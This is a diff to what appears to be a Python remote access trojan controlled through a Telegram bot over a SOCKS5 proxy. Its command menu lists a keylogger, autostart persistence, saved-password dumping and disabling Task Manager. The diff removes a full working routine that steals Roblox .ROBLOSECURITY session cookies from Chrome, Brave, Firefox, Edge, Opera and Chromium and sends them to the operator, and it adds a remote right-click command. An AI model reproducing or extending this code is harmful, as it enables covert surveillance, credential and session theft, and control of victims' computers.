@@ -16,7 +16,6 @@ import time
 import stat
 import pyaudio
 import wave
-import browser_cookie3
 import numpy as np
 import shutil
 from pynput import keyboard
@@ -24,8 +23,6 @@ from datetime import datetime, timedelta
 try:
     telebot.apihelper.proxy = {
         'http': 'socks5://68.71.240.210:4145' # if it doesn't work use another proxy
-        # If you are using paid one and you have login and password write your proxy like this
-        # socks5://login:pass@12.11.22.33:8000
     }
 
     bot = telebot.TeleBot('YOUR_API_TOKEN')
@@ -37,7 +34,6 @@ textovik = """
 - ⚙️ **/start** - Start the program
 - ⚙️ **/help** - Help with commands
 - 🔌 **/addstartup** - Add autostart
-- 📁 **/filepath** - Shows the script's full path
 - ⌨️ **/keylogger** - Start keylogger
 - ⛔ **/stopkeylogger** - Stop keylogger
 - 👟 **/run [filepath]** - Run file
@@ -56,7 +52,6 @@ textovik = """
 
 ## **🔒 Security & Privacy**
 - 🔑 **/passwords** - Show saved passwords on the PC
-- 🍪 **/robloxcookie** - Show Roblox cookies
 - 🧱 **/wallpaper** - Change the desktop wallpaper
 - 🪦 **/disabletaskmgr** - Disable Task Manager
 - 📠 **/enabletaskmgr** - Enable Task Manager
@@ -76,7 +71,8 @@ textovik = """
 - 🪤 **/mousekill** - Disable the mouse
 - 🐭 **/mousestop** - Enable the mouse
 - 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there
-- 🐁 **/mouseclick** - Make click with mouse
+- 🐁 **/mouseclick** - Make left click with mouse
+- 🖱️ **/mouseright** - Make right click with mouse
 - 🔊 **/fullvolume** - Set volume to full
 - 🔉 **/volumeplus** - Increase volume by 10
 - 🔇 **/volumeminus** - Decrease volume by 10
@@ -139,6 +135,7 @@ n = False
 @bot.message_handler(commands=['start'])
 
 def start(message):
+
     if n == False:
         bot.send_message(message.chat.id, "Enter password:")
         bot.register_next_step_handler(message, checkpass)
@@ -203,106 +200,13 @@ def handle_executable_path(message):
     
     user_state.pop(message.chat.id, None)
 #################################################################################
-@bot.message_handler(commands=['filepath'])
-def get_file_path(message):
+@bot.message_handler(commands=['mouseright'])
+def mousecontext(message):
     try:
-        fullpath = os.path.abspath(__file__)
-        bot.send_message(message.chat.id, str(fullpath))
+        pyautogui.rightClick()
+        bot.send_message(message.chat.id , 'Right mouse clicked!')
     except Exception as e:
-        bot.send_message(message.chat.id, f'Failed to add to startup: {e}')
-#################################################################################
-@bot.message_handler(commands=['robloxcookie'])
-def robloxl(message):
-    data = [] 
-
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
-        for cookie in cookies:
-            bot.send_message(message.chat.id , cookie)
-
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                global li
-                global la
-                li = cookie.name
-                la = cookie.value
-
-                
-
-    except Exception as e:
-            bot.send_message(message.chat.id , f'Error:{e}')
-  
-   
-    try:
-        cookies = browser_cookie3.brave(domain_name='roblox.com')    
-        for cookie in cookies:
-            bot.send_message(message.chat.id ,cookie)
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                print("L")
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                data.append(cookies)
-                data.append(cookie.value)
-                return data
-    except:
-        pass
-    
-    try:
-        bot.send_message(message.chat.id , f'security_cookie_name:{li}')
-        bot.send_message(message.chat.id , f'security_cookie_value:{la}')
-    except Exception as e:
-        bot.send_document(message.chat.id, f'Error:{e}')
-    try:
-        with open("all_roblox_cookie.txt", "w", encoding="utf-8") as file:
-            file.write(str(data))
-
-
-        with open("all_roblox_cookie.txt", "rb") as file:
-            bot.send_document(message.chat.id, file)
-    except Exception as e:
-        bot.send_document(message.chat.id, f'Error:{e}')
-
-    try:
-        os.remove('all_roblox_cookie.txt')
-    except Exception as e:
-        bot.send_document(message.chat.id, f'Error:{e}')        
+        bot.send_message(message.chat.id, f'Error: {e}')        
 #################################################################################
 @bot.message_handler(commands=['passwords'])
 def send_passwords(message):
